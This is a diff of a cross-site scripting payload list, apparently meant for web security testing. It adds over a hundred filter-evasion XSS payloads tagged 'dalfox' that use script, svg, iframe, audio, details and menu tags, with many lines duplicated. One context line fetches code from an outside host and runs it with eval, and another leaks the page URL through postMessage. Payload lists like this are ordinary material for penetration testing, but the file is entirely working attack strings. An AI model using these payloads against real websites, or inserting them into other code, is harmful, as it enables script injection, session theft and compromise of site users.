@@ -1,5 +1,7 @@
 payloADS
-
+Created: 01/11/2024 
+Updated: 03/12/2024
+by: Substance
 
 <img src="X" onerror="alert('XSS1')"/>
 <img src=x onerror=alert('XSS2') //>
@@ -21,3 +23,142 @@ payloADS
 <img src=x onerror="fetch('http://yourlab.com/log').then(response => response.text()).then(data => eval(data))"/>
 <img src=x onerror="Function('alert(\'XSS9\')')()"/>
 <img src=x onerror="parent.postMessage(document.location.href,'*')"/>
+<ScRipt class=dalfox>alert(1)</script>
+<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox>
+<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+<sVg/onload=prompt(1) class=dalfox>
+<sVg/onload=prompt(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfox>
+<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
+<iFrAme/src=jaVascRipt:confirm(1)></iFramE>
+<iFrAme/src=jaVascRipt:confirm(1)></iFramE>
+<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+<ScRipt class=dalfox>prompt(1)</script>
+<ScRipt class=dalfox>prompt(1)</script>
+<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+<xmp><p title="</xmp><svg/onload=alert(1)>
+<xmp><p title="</xmp><svg/onload=alert(1)>
+<ScRipt class=dalfox>print(1)</script>
+<ScRipt class=dalfox>print(1)</script>
+<ScRipt>print(1)</script>
+<ScRipt>print(1)</script>
+<sVg/onload=print(1)>
+<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
+<ScRipt class=dalfox>confirm(1)</script>
+<ScRipt class=dalfox>confirm(1)</script>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>
+<ScRipt>alert.bind()(1)</script>
+<ScRipt>alert.bind()(1)</script>
+<sVg/onload=alert.bind()(1) class=dalfox>
+<sVg/onload=alert.bind()(1) class=dalfox>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt.valueOf()(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt.valueOf()(1)></menu></div>
+<audio controls ondurationchange=alert.bind()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=alert.bind()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<ScRipt class=dalfox>alert.bind()(1)</script>
+<ScRipt class=dalfox>alert.bind()(1)</script>
+<xmp><p title="</xmp><svg/onload=print(1)>
+<xmp><p title="</xmp><svg/onload=print(1)>
+<sVg/onload=alert(1) class=dalfox>
+<sVg/onload=alert(1) class=dalfox>
+<sVg/onload=print(1) class=dalfox>
+<sVg/onload=print(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox>
+<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+<sVg/onload=prompt.valueOf()(1) class=dalfox>
+<sVg/onload=prompt.valueOf()(1) class=dalfox>
+<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox></iframe>
+<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
+<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
+<xmp><p title="</xmp><svg/onload=print(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=print(1) class=dalfox>
+<sVg/onload=alert(1)>
+<sVg/onload=alert(1)>
+<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE>
+<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
+<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=confirm(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=confirm(1)></menu></div>
+<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
+<xmp><p title="</xmp><svg/onload=prompt(1)>
+<xmp><p title="</xmp><svg/onload=prompt(1)>
+<audio controls ondurationchange=prompt.valueOf()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=prompt.valueOf()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+<ScRipt>confirm(1)</script>
+<ScRipt>confirm(1)</script>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert.bind()(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert.bind()(1)></menu></div>
+<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
+<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
+<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
+<ScRipt>prompt.valueOf()(1)</script>
+<ScRipt>prompt.valueOf()(1)</script>
+<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
+<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
+<iFrAme/src=jaVascRipt:print(1)></iFramE>
+<iFrAme/src=jaVascRipt:print(1)></iFramE>
+<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>
+<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox>
+<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox>
+<ScRipt>alert(1)</script>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
+<sVg/onload=confirm(1)>
+<sVg/onload=confirm(1)>
+<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+<sVg/onload=confirm(1) class=dalfox>
+<sVg/onload=confirm(1) class=dalfox>
+<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<xmp><p title="</xmp><svg/onload=confirm(1)>
+<xmp><p title="</xmp><svg/onload=confirm(1)>
+<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE>
+<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE>
+<sVg/onload=alert.bind()(1)>
+<sVg/onload=alert.bind()(1)>
+<sVg/onload=prompt.valueOf()(1)>
+<sVg/onload=prompt.valueOf()(1)>
+<dalfox class=dalfox>
+<dalfox class=dalfox>
+<sVg/onload=prompt(1)>
+<sVg/onload=prompt(1)>
+<iFrAme/src=jaVascRipt:prompt(1)></iFramE>
+<iFrAme/src=jaVascRipt:prompt(1)></iFramE>
+<ScRipt>prompt(1)</script>
+<ScRipt>prompt(1)</script>
+
